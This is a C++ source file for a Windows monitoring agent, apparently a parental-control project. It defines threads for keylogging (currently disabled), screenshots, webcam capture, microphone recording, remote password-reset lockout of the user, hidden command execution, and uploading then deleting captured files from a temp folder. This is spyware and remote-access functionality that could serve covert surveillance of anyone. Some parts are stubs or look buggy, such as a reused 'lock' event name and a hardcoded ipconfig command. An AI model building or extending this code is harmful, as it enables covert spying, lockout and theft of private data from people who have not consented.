#include "TaskRoutines.h"
#include <queue>

HANDLE camRequest, micRequest, lockRequest, cmdRequest, screenRequest, newDataEvent;

DWORD WINAPI initFiltering(LPVOID lpParam)
{
	return 0;
}
DWORD WINAPI initKeylogger(LPVOID lpParam)
{
	while (FALSE) { // ---------------------------------- Disabled for now
		QUERY_USER_NOTIFICATION_STATE pquns;
		SHQueryUserNotificationState(&pquns);
		if (pquns == QUNS_BUSY || pquns == QUNS_RUNNING_D3D_FULL_SCREEN) // Determine a fullscreen state
		{
			// User in fullscreen mode
			// Go to sleep until its over 0_0
			Sleep(SYNC_TIME);
			continue;
		}
		// Get time and date
		time_t rawtime;
		struct tm* timeinfo;
		time(&rawtime);
		timeinfo = localtime(&rawtime);
		char dateString[80];
		wchar_t dateStringW[80];
		// Get the date as a string
		strftime(dateString, sizeof(dateString), "keylog.%d.%m.%Y.%H.%M.%S", timeinfo);
		// Cast the string to LPCWSTR
		mbstowcs(dateStringW, dateString, strlen(dateString) + 1);//Plus null
		LPCWSTR ptr = dateStringW;
		// Call the keylogger with current date as filename
		// Filename changes every { num_seconds } declared in the keylogger.cpp file 
		keylogger(dateStringW);
	}
	return 0;
}
DWORD WINAPI initScreenshot(LPVOID lpParam)
{
	do {
		screenRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("screen"));
	} while (screenRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			screenRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(screenRequest);
		// Request Arrived..
		// Read screenshots request from disk
		screenCapture(0, 0, 1920, 1080, "screenshot.bmp");
	}
	return 0;
}
DWORD WINAPI initCamera(LPVOID lpParam)
{
	do {
		camRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("cam"));
	} while (camRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			camRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(camRequest);
		// Request Arrived..
		// Read camera request from disk
		camera();
	}
	return 0;
}
DWORD WINAPI initMic(LPVOID lpParam)
{
	do {
		micRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("mic"));
	} while (micRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			micRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(micRequest);
		// Request Arrived..
		// Read mic request from disk
		recordAudio(10); // Record for 10 seconds
	}
	return 0;
}
DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
{
	do {
		lockRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("lock"));
	} while (lockRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			lockRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(lockRequest);
		// Request Arrived..
		// Read lock request from disk
		char* newPassword = generateRandomPass();
		// TODO: Send the new password to parent account
		wchar_t wPassword[PASSWORD_LEN];
		mbstowcs(wPassword, newPassword, strlen(newPassword) + 1);
		BOOL success = lockUser(wPassword);
	}
	return 0;
}
DWORD WINAPI initRemoteCommands(LPVOID lpParam)
{
	do {
		cmdRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("cmd"));
	} while (cmdRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			cmdRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(cmdRequest);
		// Request Arrived..
		// Read cmd request from disk
		LPCWSTR cmd = L"ipconfig";
		LPCWSTR o_cmd = L" > cmd_output.txt";
		std::wstring stdResult = std::wstring(cmd) + o_cmd;
		LPCWSTR final_cmd = stdResult.c_str();
		ShellExecute(0, L"open", L"cmd.exe", final_cmd, 0, SW_HIDE);
	}
	return 0;
}

DWORD WINAPI initDataManager(LPVOID lpParam)
{
	do {
		newDataEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("lock"));
	} while (newDataEvent == NULL);
	while (TRUE) {
		WaitForSingleObject(
			newDataEvent, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(newDataEvent);
		// New data to send 
		WIN32_FIND_DATA data;
		HANDLE hFind = FindFirstFile(L"temp/*", &data);
		priority_queue<WIN32_FIND_DATA, vector<WIN32_FIND_DATA>, CompareDates> uploadQueue;

		if (hFind != INVALID_HANDLE_VALUE) {
			do // Look for new files in temp folder and insert each of them to a priority queue (sorted by date).
				uploadQueue.push(data);
			while (FindNextFile(hFind, &data));
			FindClose(hFind);
		}
		while (!uploadQueue.empty()) {
			// Get the first file in the queue
			data = uploadQueue.top();
			char filename[256];
			// Convert wchar* to char*
			sprintf(filename, "%ws", data.cFileName);
			uploadFile(filename, NULL);
			// Remove the file from temp folder after successfully uploading it
			DeleteFile(data.cFileName);
			// Remove from the queue
			uploadQueue.pop();
		}
	}
	return 0;
}

DWORD WINAPI initRequestManager(LPVOID lpParam)
{
	// Retreive events from the server.
	// Signal event for current request. E.g. camera
	while (TRUE) {
		// Look for new requests from server..

		// Parent has sent a camera request ..
		if (camRequest == NULL || !SetEvent(camRequest))
		{
			printf("SetEvent failed (%d)\n", GetLastError());
		}
		Sleep(SYNC_TIME);
	}
	return 0;
}
